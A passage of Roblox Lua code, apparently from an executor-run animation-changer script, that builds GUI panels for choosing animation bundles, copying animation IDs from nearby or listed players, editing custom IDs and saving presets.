if not currentHelpGui and LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then currentHelpGui = LocalPlayer.PlayerGui:FindFirstChild("AnimationHelpGui") end

if currentHelpGui and currentHelpGui:FindFirstChild("Main") then
local mainFrame = currentHelpGui:FindFirstChild("Main")

if mainFrame.BackgroundTransparency >= 0.9 then
-- It's hidden, let's show it smoothly
mainFrame.Visible = true
TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
Size = UDim2.new(0, 260, 0, 360),
Position = UDim2.new(0.5, -130, 0.5, -180),
BackgroundTransparency = 0
}):Play()
else
-- It's visible, let's hide it smoothly
local hideTween = TweenService:Create(mainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
Size = UDim2.new(0, 240, 0, 340),
Position = UDim2.new(0.5, -120, 0.5, -170),
BackgroundTransparency = 1
})
hideTween:Play()
hideTween.Completed:Connect(function()
if mainFrame.BackgroundTransparency == 1 then
mainFrame.Visible = false
end
end)
end
else
getgenv().CreateHelpGui()
end
end)
end

local function UpdateBundleButton(btn, bundleName, isSelected)
local grad = btn:FindFirstChildOfClass("UIGradient")
local stroke = btn:FindFirstChildOfClass("UIStroke")

if isSelected then
if grad then
grad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 200, 255)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 130, 255))
})
end
if stroke then
stroke.Color = Color3.fromRGB(220, 240, 255)
stroke.Transparency = 0
end
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextStrokeColor3 = Color3.fromRGB(0, 30, 80)
if bundleName ~= "Kat" then
btn.Text = bundleName .. " [ ON ]"
end
else
if grad then
grad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 70, 95)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 42, 60))
})
end
if stroke then
stroke.Color = Color3.fromRGB(130, 140, 180)
stroke.Transparency = 0.3
end
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextStrokeColor3 = Color3.fromRGB(20, 20, 40)
if bundleName ~= "Kat" then
btn.Text = bundleName
end
end
end

local function RefreshHighlights(ScrollFrame)
for _, child in pairs(ScrollFrame:GetChildren()) do
if child:IsA("TextButton") and child:GetAttribute("BundleName") then
local bName = child:GetAttribute("BundleName")
local isSelected = (bName == getgenv().ChosenBundleName) and (not getgenv().EnableHybridCustom)
UpdateBundleButton(child, bName, isSelected)
end
end
end

-- Enhanced Haptic Button with visual Hover effect
local function AddHapticToButton(button, intensity, duration, hoverColorOverride)
intensity = intensity or 0.8
duration = duration or 0.05
local origSize = nil

local baseTrans = button.BackgroundTransparency
button.MouseEnter:Connect(function()
if origSize == nil then origSize = button.Size end
TweenService:Create(button, TweenInfo.new(0.2), {BackgroundTransparency = math.clamp(baseTrans - 0.2, 0, 1)}):Play()
end)

button.MouseLeave:Connect(function()
TweenService:Create(button, TweenInfo.new(0.2), {BackgroundTransparency = baseTrans}):Play()
if origSize then
TweenService:Create(button, TweenInfo.new(0.15), {Size = origSize}):Play()
end
end)

button.MouseButton1Down:Connect(function()
PlayUISound("click")
TriggerSatisfyingHaptic(intensity, duration)
if origSize == nil then origSize = button.Size end
TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad), {
Size = UDim2.new(origSize.X.Scale, origSize.X.Offset - 4, origSize.Y.Scale, origSize.Y.Offset - 2)
}):Play()
end)

button.MouseButton1Up:Connect(function()
if origSize then
TweenService:Create(button, TweenInfo.new(0.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
Size = origSize
}):Play()
end
end)
end

-- ALL PLAYERS LIST MODAL (NEW FEATURE 3)
local function OpenAllPlayersListModal(ParentModal, onSelectPlayer)
local PListFrame = Instance.new("Frame")
PListFrame.Name = "AllPlayersListModal"
PListFrame.Parent = ParentModal
PListFrame.Size = UDim2.new(1, 0, 1, 0)
PListFrame.Position = UDim2.new(0, 0, 0, 0)
PListFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 22)
PListFrame.BackgroundTransparency = 0.05
PListFrame.BorderSizePixel = 0
PListFrame.ZIndex = 30

local PLCorner = Instance.new("UICorner")
PLCorner.CornerRadius = UDim.new(0, 10)
PLCorner.Parent = PListFrame

local PLStroke = Instance.new("UIStroke")
PLStroke.Parent = PListFrame
PLStroke.Color = Color3.fromRGB(255, 120, 200)
PLStroke.Thickness = 1.5

local PLTitle = Instance.new("TextLabel")
PLTitle.Parent = PListFrame
PLTitle.Size = UDim2.new(1, -60, 0, 26)
PLTitle.Position = UDim2.new(0, 10, 0, 6)
PLTitle.BackgroundTransparency = 1
PLTitle.Font = Enum.Font.Arcade
PLTitle.Text = "SELECT PLAYER FROM SERVER"
PLTitle.TextColor3 = Color3.fromRGB(255, 180, 230)
PLTitle.TextSize = 13
PLTitle.TextXAlignment = Enum.TextXAlignment.Left
PLTitle.ZIndex = 31

local ClosePLBtn = Instance.new("TextButton")
ClosePLBtn.Parent = PListFrame
ClosePLBtn.Size = UDim2.new(0, 24, 0, 24)
ClosePLBtn.Position = UDim2.new(1, -30, 0, 6)
ClosePLBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 90)
ClosePLBtn.Text = "X"
ClosePLBtn.Font = Enum.Font.GothamBold
ClosePLBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClosePLBtn.TextSize = 12
ClosePLBtn.ZIndex = 31

local CPLCorner = Instance.new("UICorner")
CPLCorner.CornerRadius = UDim.new(0, 6)
CPLCorner.Parent = ClosePLBtn
AddHapticToButton(ClosePLBtn, 0.6, 0.04)

ClosePLBtn.MouseButton1Click:Connect(function()
PListFrame:Destroy()
end)

local PLScroll = Instance.new("ScrollingFrame")
PLScroll.Parent = PListFrame
PLScroll.Size = UDim2.new(1, -12, 1, -42)
PLScroll.Position = UDim2.new(0, 6, 0, 36)
PLScroll.BackgroundColor3 = Color3.fromRGB(15, 18, 30)
PLScroll.BorderSizePixel = 0
PLScroll.ScrollBarThickness = 4
PLScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
PLScroll.ZIndex = 31

local PLLayout = Instance.new("UIListLayout")
PLLayout.Parent = PLScroll
PLLayout.SortOrder = Enum.SortOrder.Name
PLLayout.Padding = UDim.new(0, 4)

local myChar = LocalPlayer.Character
local myPos = (myChar and myChar:FindFirstChild("HumanoidRootPart")) and myChar.HumanoidRootPart.Position or Vector3.zero

for _, player in ipairs(Players:GetPlayers()) do
local pRow = Instance.new("Frame")
pRow.Parent = PLScroll
pRow.Name = player.Name
pRow.Size = UDim2.new(1, -8, 0, 32)
pRow.BackgroundColor3 = (player == LocalPlayer) and Color3.fromRGB(35, 55, 85) or Color3.fromRGB(25, 28, 45)
pRow.BorderSizePixel = 0
pRow.ZIndex = 32

local prCorner = Instance.new("UICorner")
prCorner.CornerRadius = UDim.new(0, 6)
prCorner.Parent = pRow

local pDist = "N/A"
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and myPos ~= Vector3.zero then
local d = (player.Character.HumanoidRootPart.Position - myPos).Magnitude
pDist = math.floor(d) .. "m"
end

local pLabel = Instance.new("TextLabel")
pLabel.Parent = pRow
pLabel.Position = UDim2.new(0, 8, 0, 0)
pLabel.Size = UDim2.new(1, -70, 1, 0)
pLabel.BackgroundTransparency = 1
pLabel.Font = Enum.Font.Gotham
pLabel.Text = player.DisplayName .. " (@" .. player.Name .. ") [" .. pDist .. "]"
pLabel.TextColor3 = Color3.fromRGB(230, 240, 255)
pLabel.TextSize = 11
pLabel.TextXAlignment = Enum.TextXAlignment.Left
pLabel.ZIndex = 33

local selectB = Instance.new("TextButton")
selectB.Parent = pRow
selectB.Size = UDim2.new(0, 52, 0, 22)
selectB.Position = UDim2.new(1, -58, 0.5, -11)
selectB.BackgroundColor3 = Color3.fromRGB(100, 200, 140)
selectB.Text = "Copy"
selectB.Font = Enum.Font.Antique
selectB.TextColor3 = Color3.fromRGB(255, 255, 255)
selectB.TextSize = 12
selectB.ZIndex = 33

local sbCorner = Instance.new("UICorner")
sbCorner.CornerRadius = UDim.new(0, 5)
sbCorner.Parent = selectB
AddHapticToButton(selectB, 0.8, 0.05)

selectB.MouseButton1Click:Connect(function()
onSelectPlayer(player, pDist)
PListFrame:Destroy()
end)
end
end

-- COPY PLAYER ANIMATIONS MODAL
local function OpenCopyPlayerModal(ParentEditor, inputBoxes)
local ModalFrame = Instance.new("Frame")
ModalFrame.Name = "CopyPlayerModal"
ModalFrame.Parent = ParentEditor
ModalFrame.Size = UDim2.new(1, 0, 1, 0)
ModalFrame.Position = UDim2.new(0, 0, 0, 0)
ModalFrame.BackgroundColor3 = Color3.fromRGB(12, 10, 22)
ModalFrame.BackgroundTransparency = 0.05
ModalFrame.BorderSizePixel = 0
ModalFrame.ZIndex = 20

local MCorner = Instance.new("UICorner")
MCorner.CornerRadius = UDim.new(0, 10)
MCorner.Parent = ModalFrame

local MStroke = Instance.new("UIStroke")
MStroke.Parent = ModalFrame
MStroke.Color = Color3.fromRGB(255, 200, 100)
MStroke.Thickness = 1.5

local MTitle = Instance.new("TextLabel")
MTitle.Parent = ModalFrame
MTitle.Size = UDim2.new(1, -20, 0, 24)
MTitle.Position = UDim2.new(0, 10, 0, 6)
MTitle.BackgroundTransparency = 1
MTitle.Font = Enum.Font.Arcade
MTitle.Text = "COPY ANIMATIONS FROM PLAYER"
MTitle.TextColor3 = Color3.fromRGB(255, 220, 120)
MTitle.TextSize = 13
MTitle.TextXAlignment = Enum.TextXAlignment.Left
MTitle.ZIndex = 21

local SelectRow = Instance.new("Frame")
SelectRow.Parent = ModalFrame
SelectRow.Size = UDim2.new(1, -12, 0, 28)
SelectRow.Position = UDim2.new(0, 6, 0, 32)
SelectRow.BackgroundTransparency = 1
SelectRow.ZIndex = 21

local SelectedPlayerLabel = Instance.new("TextLabel")
SelectedPlayerLabel.Parent = SelectRow
SelectedPlayerLabel.Size = UDim2.new(0.5, -4, 1, 0)
SelectedPlayerLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
SelectedPlayerLabel.Font = Enum.Font.Gotham
SelectedPlayerLabel.Text = " Target: LocalPlayer (Me)"
SelectedPlayerLabel.TextColor3 = Color3.fromRGB(180, 220, 255)
SelectedPlayerLabel.TextSize = 10
SelectedPlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
SelectedPlayerLabel.ZIndex = 22

local SPLCorner = Instance.new("UICorner")
SPLCorner.CornerRadius = UDim.new(0, 5)
SPLCorner.Parent = SelectedPlayerLabel

local NearbyBtn = Instance.new("TextButton")
NearbyBtn.Parent = SelectRow
NearbyBtn.Size = UDim2.new(0.24, -2, 1, 0)
NearbyBtn.Position = UDim2.new(0.52, 0, 0, 0)
NearbyBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
NearbyBtn.Font = Enum.Font.Antique
NearbyBtn.Text = "Nearest"
NearbyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NearbyBtn.TextSize = 11
NearbyBtn.ZIndex = 22

local NBCorner = Instance.new("UICorner")
NBCorner.CornerRadius = UDim.new(0, 5)
NBCorner.Parent = NearbyBtn
AddHapticToButton(NearbyBtn, 0.6, 0.04)

local AllPlayersBtn = Instance.new("TextButton")
AllPlayersBtn.Parent = SelectRow
AllPlayersBtn.Size = UDim2.new(0.24, -2, 1, 0)
AllPlayersBtn.Position = UDim2.new(0.76, 2, 0, 0)
AllPlayersBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 180)
AllPlayersBtn.Font = Enum.Font.Antique
AllPlayersBtn.Text = "All Players 👥"
AllPlayersBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AllPlayersBtn.TextSize = 10
AllPlayersBtn.ZIndex = 22

local APBCorner = Instance.new("UICorner")
APBCorner.CornerRadius = UDim.new(0, 5)
APBCorner.Parent = AllPlayersBtn
AddHapticToButton(AllPlayersBtn, 0.7, 0.05)

local currentTargetPlayer = LocalPlayer
local extractedIDs = ExtractPlayerAnims(currentTargetPlayer)

local SlotsScroll = Instance.new("ScrollingFrame")
SlotsScroll.Parent = ModalFrame
SlotsScroll.Size = UDim2.new(1, -12, 1, -100)
SlotsScroll.Position = UDim2.new(0, 6, 0, 64)
SlotsScroll.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
SlotsScroll.BorderSizePixel = 0
SlotsScroll.ScrollBarThickness = 4
SlotsScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
SlotsScroll.ZIndex = 21

local SSList = Instance.new("UIListLayout")
SSList.Parent = SlotsScroll
SSList.SortOrder = Enum.SortOrder.LayoutOrder
SSList.Padding = UDim.new(0, 4)

local selectedCheckboxes = {}

local function RefreshSlots()
for _, ch in pairs(SlotsScroll:GetChildren()) do
if ch:IsA("Frame") then ch:Destroy() end
end
selectedCheckboxes = {}

extractedIDs = ExtractPlayerAnims(currentTargetPlayer)

local slotNames = {
idle1 = "Idle 1", idle2 = "Idle 2", walk = "Walk", run = "Run",
jump = "Jump", fall = "Fall", climb = "Climb", swim = "Swim", swimidle = "Swim Idle"
}

for idx, key in ipairs(ANIM_KEYS) do
local foundID = extractedIDs[key]
local isAvailable = (foundID ~= nil and foundID ~= "")

local Row = Instance.new("Frame")
Row.Parent = SlotsScroll
Row.LayoutOrder = idx
Row.Size = UDim2.new(1, -8, 0, 26)
Row.BackgroundColor3 = isAvailable and Color3.fromRGB(30, 35, 50) or Color3.fromRGB(20, 22, 30)
Row.BorderSizePixel = 0
Row.ZIndex = 22

local RC = Instance.new("UICorner")
RC.CornerRadius = UDim.new(0, 4)
RC.Parent = Row

local CheckBtn = Instance.new("TextButton")
CheckBtn.Parent = Row
CheckBtn.Position = UDim2.new(0, 4, 0.5, -9)
CheckBtn.Size = UDim2.new(0, 18, 0, 18)
CheckBtn.BackgroundColor3 = isAvailable and Color3.fromRGB(80, 180, 100) or Color3.fromRGB(50, 50, 60)
CheckBtn.Text = isAvailable and "✓" or ""
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.TextSize = 12
CheckBtn.ZIndex = 23

local CBC = Instance.new("UICorner")
CBC.CornerRadius = UDim.new(0, 3)
CBC.Parent = CheckBtn

local isChecked = isAvailable
selectedCheckboxes[key] = {checked = isChecked, id = foundID}

CheckBtn.MouseButton1Click:Connect(function()
TriggerSatisfyingHaptic(0.5, 0.03)
isChecked = not isChecked
selectedCheckboxes[key].checked = isChecked
CheckBtn.Text = isChecked and "✓" or ""
CheckBtn.BackgroundColor3 = isChecked and Color3.fromRGB(80, 180, 100) or Color3.fromRGB(50, 50, 60)
end)

local Label = Instance.new("TextLabel")
Label.Parent = Row
Label.Position = UDim2.new(0, 28, 0, 0)
Label.Size = UDim2.new(1, -32, 1, 0)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.Gotham
local displayIdStr = isAvailable and tostring(foundID):gsub("rbxassetid://", "") or "(Not Found)"
Label.Text = (slotNames[key] or key) .. ": " .. displayIdStr
Label.TextColor3 = isAvailable and Color3.fromRGB(220, 240, 255) or Color3.fromRGB(120, 125, 140)
Label.TextSize = 10
Label.TextXAlignment = Enum.TextXAlignment.Left
Label.ZIndex = 23
end
end

RefreshSlots()

NearbyBtn.MouseButton1Click:Connect(function()
local closestPlayer = nil
local minDistance = math.huge
local myChar = LocalPlayer.Character
if myChar and myChar:FindFirstChild("HumanoidRootPart") then
local myPos = myChar.HumanoidRootPart.Position
for _, p in pairs(Players:GetPlayers()) do
if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
local dist = (p.Character.HumanoidRootPart.Position - myPos).Magnitude
if dist < minDistance then
minDistance = dist
closestPlayer = p
end
end
end
end

if closestPlayer then
currentTargetPlayer = closestPlayer
SelectedPlayerLabel.Text = " Target: " .. closestPlayer.DisplayName .. " (" .. math.floor(minDistance) .. "m)"
RefreshSlots()
else
SelectedPlayerLabel.Text = " No nearby players found!"
end
end)

AllPlayersBtn.MouseButton1Click:Connect(function()
OpenAllPlayersListModal(ModalFrame, function(selectedP, pDist)
currentTargetPlayer = selectedP
SelectedPlayerLabel.Text = " Target: " .. selectedP.DisplayName .. " (" .. pDist .. ")"
RefreshSlots()
end)
end)

local BottomRow = Instance.new("Frame")
BottomRow.Parent = ModalFrame
BottomRow.Size = UDim2.new(1, -12, 0, 30)
BottomRow.Position = UDim2.new(0, 6, 1, -34)
BottomRow.BackgroundTransparency = 1
BottomRow.ZIndex = 21

local DoneBtn = Instance.new("TextButton")
DoneBtn.Parent = BottomRow
DoneBtn.Size = UDim2.new(0.48, 0, 1, 0)
DoneBtn.Position = UDim2.new(0, 0, 0, 0)
DoneBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
DoneBtn.Text = "Done (Copy Selected)"
DoneBtn.Font = Enum.Font.Antique
DoneBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DoneBtn.TextSize = 13
DoneBtn.ZIndex = 22

local DBC = Instance.new("UICorner")
DBC.CornerRadius = UDim.new(0, 6)
DBC.Parent = DoneBtn
AddHapticToButton(DoneBtn, 0.9, 0.08)

DoneBtn.MouseButton1Click:Connect(function()
PlayUISound("success")
local countCopied = 0
for _, key in ipairs(ANIM_KEYS) do
local item = selectedCheckboxes[key]
if item and item.checked and item.id and item.id ~= "" then
local cleanVal = tostring(item.id):gsub("rbxassetid://", "")
if inputBoxes[key] then
inputBoxes[key].Text = cleanVal
getgenv().CurrentCustomIDs[key] = cleanVal
countCopied = countCopied + 1
end
end
end
print("Copied " .. countCopied .. " animation IDs to Custom Animation GUI!")
ModalFrame:Destroy()
end)

local CancelBtn = Instance.new("TextButton")
CancelBtn.Parent = BottomRow
CancelBtn.Size = UDim2.new(0.48, 0, 1, 0)
CancelBtn.Position = UDim2.new(0.52, 0, 0, 0)
CancelBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 90)
CancelBtn.Text = "Cancel"
CancelBtn.Font = Enum.Font.Antique
CancelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CancelBtn.TextSize = 13
CancelBtn.ZIndex = 22

local CBC = Instance.new("UICorner")
CBC.CornerRadius = UDim.new(0, 6)
CBC.Parent = CancelBtn
AddHapticToButton(CancelBtn, 0.6, 0.04)

CancelBtn.MouseButton1Click:Connect(function()
ModalFrame:Destroy()
end)
end

-- CUSTOM EDITOR SUB-PAGE
local function OpenCustomEditor(ParentMain, MainScrollFrame)
local EditorFrame = Instance.new("Frame")
EditorFrame.Name = "CustomEditor"
EditorFrame.Parent = ParentMain
EditorFrame.Size = UDim2.new(1, -12, 1, -76)
EditorFrame.Position = UDim2.new(0, 6, 0, 70)
EditorFrame.BackgroundColor3 = Color3.fromRGB(15, 12, 28)
EditorFrame.BackgroundTransparency = 0.1
EditorFrame.BorderSizePixel = 0
EditorFrame.ZIndex = 5

local EFCorner = Instance.new("UICorner")
EFCorner.CornerRadius = UDim.new(0, 10)
EFCorner.Parent = EditorFrame

local EFStroke = Instance.new("UIStroke")
EFStroke.Parent = EditorFrame
EFStroke.Color = Color3.fromRGB(160, 130, 220)
EFStroke.Thickness = 1.5
EFStroke.Transparency = 0.2

local EditorScroll = Instance.new("ScrollingFrame")
EditorScroll.Parent = EditorFrame
EditorScroll.Size = UDim2.new(1, -8, 1, -8)
EditorScroll.Position = UDim2.new(0, 4, 0, 4)
EditorScroll.BackgroundTransparency = 1
EditorScroll.BorderSizePixel = 0
EditorScroll.ScrollBarThickness = 5
EditorScroll.ScrollBarImageColor3 = Color3.fromRGB(200, 130, 255)
EditorScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
EditorScroll.ZIndex = 6

local EList = Instance.new("UIListLayout")
EList.Parent = EditorScroll
EList.SortOrder = Enum.SortOrder.LayoutOrder
EList.Padding = UDim.new(0, 5)

local EPad = Instance.new("UIPadding")
EPad.Parent = EditorScroll
EPad.PaddingTop = UDim.new(0, 6)
EPad.PaddingLeft = UDim.new(0, 6)
EPad.PaddingRight = UDim.new(0, 6)
EPad.PaddingBottom = UDim.new(0, 6)

local HeaderRow = Instance.new("Frame")
HeaderRow.Parent = EditorScroll
HeaderRow.LayoutOrder = 1
HeaderRow.Size = UDim2.new(1, -10, 0, 26)
HeaderRow.BackgroundTransparency = 1
HeaderRow.ZIndex = 6

local EHeader = Instance.new("TextLabel")
EHeader.Parent = HeaderRow
EHeader.Size = UDim2.new(0.6, 0, 1, 0)
EHeader.BackgroundTransparency = 1
EHeader.Font = Enum.Font.Arcade
EHeader.Text = "CUSTOM ANIM IDs"
EHeader.TextColor3 = Color3.fromRGB(255, 215, 100)
EHeader.TextSize = 14
EHeader.TextXAlignment = Enum.TextXAlignment.Left
EHeader.ZIndex = 6

local CopyPlayerBtn = Instance.new("TextButton")
CopyPlayerBtn.Parent = HeaderRow
CopyPlayerBtn.Size = UDim2.new(0.4, 0, 1, 0)
CopyPlayerBtn.Position = UDim2.new(0.6, 0, 0, 0)
CopyPlayerBtn.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
CopyPlayerBtn.Font = Enum.Font.Antique
CopyPlayerBtn.Text = "📋 Copy Player"
CopyPlayerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyPlayerBtn.TextSize = 12
CopyPlayerBtn.ZIndex = 7

local CPCorner = Instance.new("UICorner")
CPCorner.CornerRadius = UDim.new(0, 6)
CPCorner.Parent = CopyPlayerBtn

AddHapticToButton(CopyPlayerBtn, 0.8, 0.05)

local EInfo = Instance.new("TextLabel")
EInfo.Parent = EditorScroll
EInfo.LayoutOrder = 2
EInfo.BackgroundTransparency = 1
EInfo.Size = UDim2.new(1, -10, 0, 14)
EInfo.Font = Enum.Font.Gotham
EInfo.Text = "Paste ID or click Copy Player to import"
EInfo.TextColor3 = Color3.fromRGB(180, 200, 255)
EInfo.TextSize = 10
EInfo.TextXAlignment = Enum.TextXAlignment.Left
EInfo.ZIndex = 6

local inputBoxes = {}
local keyLabels = {
idle1 = "Idle 1", idle2 = "Idle 2", walk = "Walk", run = "Run",
jump = "Jump", fall = "Fall", climb = "Climb", swim = "Swim", swimidle = "Swim Idle"
}

local keyColors = {
idle1 = Color3.fromRGB(150, 220, 255), idle2 = Color3.fromRGB(150, 220, 255),
walk = Color3.fromRGB(180, 255, 150), run = Color3.fromRGB(255, 200, 100),
jump = Color3.fromRGB(255, 150, 220), fall = Color3.fromRGB(255, 130, 130),
climb = Color3.fromRGB(220, 180, 255), swim = Color3.fromRGB(130, 220, 220),
swimidle = Color3.fromRGB(130, 220, 220)
}

for i, key in ipairs(ANIM_KEYS) do
local Row = Instance.new("Frame")
Row.Parent = EditorScroll
Row.LayoutOrder = 10 + i
Row.Size = UDim2.new(1, -10, 0, 32)
Row.BackgroundColor3 = Color3.fromRGB(30, 32, 45)
Row.BorderSizePixel = 0
Row.ZIndex = 6

local RC = Instance.new("UICorner")
RC.CornerRadius = UDim.new(0, 6)
RC.Parent = Row

local RS = Instance.new("UIStroke")
RS.Parent = Row
RS.Color = keyColors[key] or Color3.fromRGB(120, 120, 180)
RS.Thickness = 1
RS.Transparency = 0.5

local Label = Instance.new("TextLabel")
Label.Parent = Row
Label.BackgroundTransparency = 1
Label.Position = UDim2.new(0, 6, 0, 0)
Label.Size = UDim2.new(0, 60, 1, 0)
Label.Font = Enum.Font.Antique
Label.Text = keyLabels[key]
Label.TextColor3 = keyColors[key] or Color3.fromRGB(255, 255, 255)
Label.TextSize = 14
Label.TextXAlignment = Enum.TextXAlignment.Left
Label.ZIndex = 7

local Input = Instance.new("TextBox")
Input.Parent = Row
Input.Position = UDim2.new(0, 70, 0.5, -11)
Input.Size = UDim2.new(1, -78, 0, 22)
Input.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
Input.BorderSizePixel = 0
Input.Font = Enum.Font.Gotham
Input.PlaceholderText = "e.g. 10921269718"
Input.PlaceholderColor3 = Color3.fromRGB(110, 115, 140)
Input.Text = getgenv().CurrentCustomIDs[key] or ""
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextSize = 12
Input.ClearTextOnFocus = false
Input.TextXAlignment = Enum.TextXAlignment.Left
Input.ZIndex = 7

local IC = Instance.new("UICorner")
IC.CornerRadius = UDim.new(0, 4)
IC.Parent = Input

local IPad = Instance.new("UIPadding")
IPad.Parent = Input
IPad.PaddingLeft = UDim.new(0, 6)
IPad.PaddingRight = UDim.new(0, 6)

local IS = Instance.new("UIStroke")
IS.Parent = Input
IS.Color = Color3.fromRGB(90, 100, 140)
IS.Thickness = 1
IS.Transparency = 0.4

Input.Focused:Connect(function()
TriggerSatisfyingHaptic(0.4, 0.03)
TweenService:Create(IS, TweenInfo.new(0.2), {
Color = keyColors[key] or Color3.fromRGB(200, 200, 255),
Transparency = 0
}):Play()
end)
Input.FocusLost:Connect(function()
TweenService:Create(IS, TweenInfo.new(0.2), {
Color = Color3.fromRGB(90, 100, 140),
Transparency = 0.4
}):Play()
getgenv().CurrentCustomIDs[key] = Input.Text
end)

inputBoxes[key] = Input
end

CopyPlayerBtn.MouseButton1Click:Connect(function()
OpenCopyPlayerModal(EditorFrame, inputBoxes)
end)

local function GetInputData()
local d = {}
for _, key in ipairs(ANIM_KEYS) do
d[key] = inputBoxes[key].Text
getgenv().CurrentCustomIDs[key] = inputBoxes[key].Text
end
return d
end

local ActionRow = Instance.new("Frame")
ActionRow.Parent = EditorScroll
ActionRow.LayoutOrder = 100
ActionRow.Size = UDim2.new(1, -10, 0, 36)
ActionRow.BackgroundTransparency = 1
ActionRow.ZIndex = 6

local ApplyBtn = Instance.new("TextButton")
ApplyBtn.Parent = ActionRow
ApplyBtn.Size = UDim2.new(0.48, 0, 1, 0)
ApplyBtn.Position = UDim2.new(0, 0, 0, 0)
ApplyBtn.BackgroundColor3 = Color3.fromRGB(90, 220, 130)
ApplyBtn.Text = "Apply Now"
ApplyBtn.Font = Enum.Font.Antique
ApplyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ApplyBtn.TextSize = 16
ApplyBtn.AutoButtonColor = false
ApplyBtn.BorderSizePixel = 0
ApplyBtn.ZIndex = 7

local ABC = Instance.new("UICorner")
ABC.CornerRadius = UDim.new(0, 8)
ABC.Parent = ApplyBtn

AddHapticToButton(ApplyBtn, 1, 0.1)

ApplyBtn.MouseButton1Click:Connect(function()
PlayUISound("success")
local data = GetInputData()
getgenv().ApplyCustomIDs(data)
local origText = ApplyBtn.Text
ApplyBtn.Text = "✓ Applied!"
task.delay(1, function()
if ApplyBtn and ApplyBtn.Parent then ApplyBtn.Text = origText end
end)
end)

local ClearBtn = Instance.new("TextButton")
ClearBtn.Parent = ActionRow
ClearBtn.Size = UDim2.new(0.48, 0, 1, 0)
ClearBtn.Position = UDim2.new(0.52, 0, 0, 0)
ClearBtn.BackgroundColor3 = Color3.fromRGB(240, 120, 90)
ClearBtn.Text = "Clear All"
ClearBtn.Font = Enum.Font.Antique
ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearBtn.TextSize = 16
ClearBtn.AutoButtonColor = false
ClearBtn.BorderSizePixel = 0
ClearBtn.ZIndex = 7

local CBC = Instance.new("UICorner")
CBC.CornerRadius = UDim.new(0, 8)
CBC.Parent = ClearBtn

AddHapticToButton(ClearBtn, 0.8, 0.08)

ClearBtn.MouseButton1Click:Connect(function()
for _, key in ipairs(ANIM_KEYS) do
inputBoxes[key].Text = ""
getgenv().CurrentCustomIDs[key] = ""
end
end)

local SaveHeader = Instance.new("TextLabel")
SaveHeader.Parent = EditorScroll
SaveHeader.LayoutOrder = 110
SaveHeader.BackgroundTransparency = 1
SaveHeader.Size = UDim2.new(1, -10, 0, 22)
SaveHeader.Font = Enum.Font.Arcade
SaveHeader.Text = "SAVE AS PRESET"
SaveHeader.TextColor3 = Color3.fromRGB(200, 150, 255)
SaveHeader.TextSize = 14
SaveHeader.TextXAlignment = Enum.TextXAlignment.Left
SaveHeader.ZIndex = 6

local SaveRow = Instance.new("Frame")
SaveRow.Parent = EditorScroll
SaveRow.LayoutOrder = 111
SaveRow.Size = UDim2.new(1, -10, 0, 32)
SaveRow.BackgroundTransparency = 1
SaveRow.ZIndex = 6

local NameInput = Instance.new("TextBox")
NameInput.Parent = SaveRow
NameInput.Size = UDim2.new(0.6, -4, 1, 0)
NameInput.Position = UDim2.new(0, 0, 0, 0)
NameInput.BackgroundColor3 = Color3.fromRGB(30, 32, 48)
NameInput.BorderSizePixel = 0
NameInput.Font = Enum.Font.Gotham
NameInput.PlaceholderText = "Preset name..."
NameInput.PlaceholderColor3 = Color3.fromRGB(110, 115, 140)
NameInput.Text = ""
NameInput.TextColor3 = Color3.fromRGB(255, 255, 255)
NameInput.TextSize = 13
NameInput.ClearTextOnFocus = false
NameInput.TextXAlignment = Enum.TextXAlignment.Left
NameInput.ZIndex = 7

local NIC = Instance.new("UICorner")
NIC.CornerRadius = UDim.new(0, 6)
NIC.Parent = NameInput

local SaveBtn = Instance.new("TextButton")
SaveBtn.Parent = SaveRow
SaveBtn.Size = UDim2.new(0.4, -4, 1, 0)
SaveBtn.Position = UDim2.new(0.6, 4, 0, 0)
SaveBtn.BackgroundColor3 = Color3.fromRGB(180, 80, 255)
SaveBtn.Text = "Save"
SaveBtn.Font = Enum.Font.Antique
SaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveBtn.TextSize = 15
SaveBtn.AutoButtonColor = false
SaveBtn.BorderSizePixel = 0
SaveBtn.ZIndex = 7

local SBC = Instance.new("UICorner")
SBC.CornerRadius = UDim.new(0, 6)
SBC.Parent = SaveBtn

AddHapticToButton(SaveBtn, 1, 0.1)
